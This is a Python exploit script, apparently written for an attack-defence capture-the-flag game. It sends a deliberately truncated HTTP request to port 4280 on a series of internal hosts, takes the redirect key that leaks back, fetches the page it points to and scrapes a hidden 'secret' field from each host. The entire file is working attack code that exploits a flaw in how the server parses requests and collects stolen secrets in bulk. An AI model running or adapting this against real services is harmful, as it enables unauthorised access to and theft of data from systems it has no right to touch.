import socket
import errno
import requests
import re

from bs4 import BeautifulSoup

import sys

payload = b'POST / HTTP/1.1\nHost: localhost:4280\nUser-Agent: python-requests/2.18.4\n' + \
	b'Accept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\nContent-Length'

hosts = ['10.60.%d.2' % i for i in range(6, 13)]

sockets = []
for host in hosts:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host, 4280))
		s.setblocking(0)
		s.send(payload)
		sockets.append((s, host))
	except:
		print(host)
		raise


found = set()
i = 0
for s, host in sockets:
	i += 1
	data = b''
	for _ in range(10):
		try:
			data = s.recv(4096).decode('utf-8')
			break
		except socket.error as e:
			if e.errno != errno.EAGAIN and e.errno != errno.EWOULDBLOCK:
				break
	s.close()
	if len(data) == 0:
		continue
	try:
		key = re.search(r'Location: /([A-Z]+)', data).group(1)
		response = requests.get('http://' + host + ':4280/' + key)
		soup = BeautifulSoup(response.text, features="html.parser")
		secret = soup.find(id="secret").text
		if secret != '':
			found.add((secret, host))
	except:
		pass

for secret in found:
	print('Found:', secret)
